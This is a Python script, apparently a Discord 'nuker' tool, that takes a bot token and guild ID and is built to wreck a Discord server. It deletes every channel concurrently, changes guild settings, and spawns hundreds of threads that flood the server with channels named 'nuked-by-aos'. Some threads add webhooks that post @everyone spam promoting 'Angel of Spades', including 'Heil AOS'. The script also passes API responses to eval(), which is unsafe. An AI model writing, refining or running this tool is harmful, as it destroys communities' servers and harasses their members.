import aiohttp
import asyncio
import time
import requests
import json
import threading

null = None
false = False
true = True

discord_api_version = 9
discord_api_base_url = f"https://discord.com/api/v{discord_api_version}"

token = "" #Bot token
guild_id = "" #Guild to nuke

bot_token = "Bot " + token
headers = {"Authorization": bot_token , 'Content-type': 'application/json'}


def spam_channels():
	try:
		headers = {"Authorization": bot_token , 'Content-type': 'application/json'}
		payload = {"type":0,"name":"nuked-by-aos","permission_overwrites":[]}
		r = requests.post(f"{discord_api_base_url}/guilds/{guild_id}/channels?name='nuked-by-aos'", headers=headers , data = json.dumps(payload))
		new_channel_info = eval(r.text)
		new_channel_id = new_channel_info["id"]
		print("Created a channel")
	except:
		pass

	try:
		payload = {"name":"AOS"}
		r = requests.post(f"{discord_api_base_url}/channels/{new_channel_id}/webhooks", headers=headers , data = json.dumps(payload))
		new_webhook_info = eval(r.text)
		new_webhook_id = new_webhook_info["id"]
		new_webhook_token = new_webhook_info["token"]
		new_webhook_url = f"https://discord.com/api/webhooks/{new_webhook_id}/{new_webhook_token}"
	except:
		pass

	for message_number in range(30):
		try:
			data = {"content" : "@everyone you got nuked by Angel of Spades | Heil AOS |  https://www.youtube.com/channel/UCCDXW2YCAJbRepHU6HJY1yA | https://discord.gg/pAjN5VSs6B"}
			r = requests.post(new_webhook_url, json = data)
		except:
			pass

def spam_channels_weaker():
	try:
		headers = {"Authorization": bot_token , 'Content-type': 'application/json'}
		payload = {"type":0,"name":"nuked-by-aos","permission_overwrites":[]}
		r = requests.post(f"{discord_api_base_url}/guilds/{guild_id}/channels?name='nuked-by-aos'", headers=headers , data = json.dumps(payload))
		new_channel_info = eval(r.text)
		new_channel_id = new_channel_info["id"]
		print("Created a channel")
	except:
		pass


async def delete_channel(session, url):
	async with session.delete(url) as resp:
		try:
			response = await resp.json()
			return response
		except:
			pass

async def nuke(guild_channels):

	data_payload = {
    "description": None,
    "features": ["NEWS"],
    "preferred_locale": "en-US",
    "rules_channel_id": None,
    "public_updates_channel_id": None}


	try:
		r = requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}" ,headers = headers , json = data_payload)
	except:
		pass

	async with aiohttp.ClientSession(headers=headers) as session:

		tasks = []
		for channel in guild_channels:
			try:
				channel_id = channel["id"]
				url = f"{discord_api_base_url}/channels/{channel_id}"
				tasks.append(asyncio.ensure_future(delete_channel(session, url)))
			except:
				pass
		
		responses = await asyncio.gather(*tasks)
		for response in responses:
			try:
				name = response["name"]
				id = response["id"]
				print(f"Deleted channel {name} | Id --> {id}")
			except:
				pass
			
		thread_list = []
		for x in range(50):
			try:
				thread = threading.Thread(target=spam_channels,)
				thread_list.append(thread)
				thread.start()
			except:
				pass
	
		for x in range(300):
			try:
				thread = threading.Thread(target=spam_channels_weaker,)
				thread_list.append(thread)
				thread.start()
			except:
				pass

		for thread in thread_list:
			thread.join()

r = requests.get(f"{discord_api_base_url}/guilds/{guild_id}/channels", headers=headers)
guild_channels = eval(r.text)
asyncio.run(nuke(guild_channels))